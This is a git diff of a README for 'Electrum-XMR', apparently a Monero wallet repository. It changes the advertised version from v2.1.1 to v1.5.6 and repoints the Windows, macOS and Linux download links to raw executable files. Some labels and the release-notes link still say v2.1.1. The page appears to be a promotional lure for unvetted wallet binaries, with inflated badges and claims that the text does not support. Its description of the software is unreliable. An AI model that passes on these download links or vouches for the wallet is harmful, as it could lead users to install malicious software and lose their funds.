@@ -1,4 +1,4 @@
-[![Galactic Release v2.1.1](https://img.shields.io/badge/Release-v2.1.1-4A90E2?style=for-the-badge)](https://github.com/gekkonfs/Electrum-XMR/releases/tag/v.2.1.1)
+[![Galactic Release v1.5.6](https://img.shields.io/badge/Release-v1.5.6-4A90E2?style=for-the-badge)](https://github.com/gekkonfs/Electrum-XMR/releases/tag/v.1.5.6)
 [![Quantum Build](https://img.shields.io/badge/Build-Quantum-8E44AD?style=for-the-badge)](https://github.com/gekkonfs/Electrum-XMR/actions/workflows/build.yml)
 [![Open Source Freedom](https://img.shields.io/badge/Open%20Source-Freedom-blueviolet?style=for-the-badge)](https://github.com/gekkonfs/Electrum-XMR)
 [![Monero Titan](https://img.shields.io/badge/Monero-Titan-E67E22?style=for-the-badge&logo=monero&logoColor=white)](https://getmonero.org)
@@ -18,17 +18,17 @@ Electrum-XMR is a lightweight and fast Monero wallet based on the popular Electr
 - 💼 **User-friendly**: A simple interface designed for seamless usage with a focus on functionality.
 - 🔁 **High compatibility**: Supports Monero's advanced features like RingCT, Stealth Addresses, and Bulletproofs.
 
-## 🔥 Latest Release: v2.1.1
-The latest release of Electrum-XMR, v2.1.1, brings several performance improvements and bug fixes. Make sure to update to the latest version to enjoy a smoother experience.
+## 🔥 Latest Release: v1.5.6
+The latest release of Electrum-XMR, v1.5.6, brings several performance improvements and bug fixes. Make sure to update to the latest version to enjoy a smoother experience.
 
 - **[Release Notes](https://github.com/gekkonfs/Electrum-XMR/releases/tag/v.2.1.1)**
 ## 🚀 Download
 Electrum-XMR is available for download in various formats to suit your platform:
 
 ### 🖥️ For Desktop
-- **Windows**: [Electrum-XMR v2.1.1 for Windows](https://github.com/gekkonfs/Electrum-XMR/releases/download/v.2.1.1/Electrum-XMR-v2.1.1-win64.zip)
-- **macOS**: [Electrum-XMR v2.1.1 for macOS](https://github.com/gekkonfs/Electrum-XMR/releases/download/v.2.1.1/Electrum-XMR-v2.1.1-macos.zip)
-- **Linux**: [Electrum-XMR v2.1.1 for Linux](https://github.com/gekkonfs/Electrum-XMR/releases/download/v.2.1.1/Electrum-XMR-v2.1.1-linux.tar.gz)
+- **Windows**: [Electrum-XMR v2.1.1 for Windows](https://github.com/gekkonfs/Electrum-XMR/releases/download/v1.5.6/electrum-xmr-1.5.6.exe)
+- **macOS**: [Electrum-XMR v2.1.1 for macOS](https://github.com/gekkonfs/Electrum-XMR/releases/download/v1.5.6/electrum-xmr-1.5.6.dmg)
+- **Linux**: [Electrum-XMR v2.1.1 for Linux](https://github.com/gekkonfs/Electrum-XMR/releases/download/v1.5.6/electrum-xmr-1.5.6.AppImage)
 
 ### 💡 Why Choose Electrum-XMR?
 While there are many Monero wallets out there, Electrum-XMR is built with the best in mind. It's not just about storing your coins – it's about enabling a seamless, lightning-fast user experience in the world of Monero transactions. Here's why you should pick Electrum-XMR:
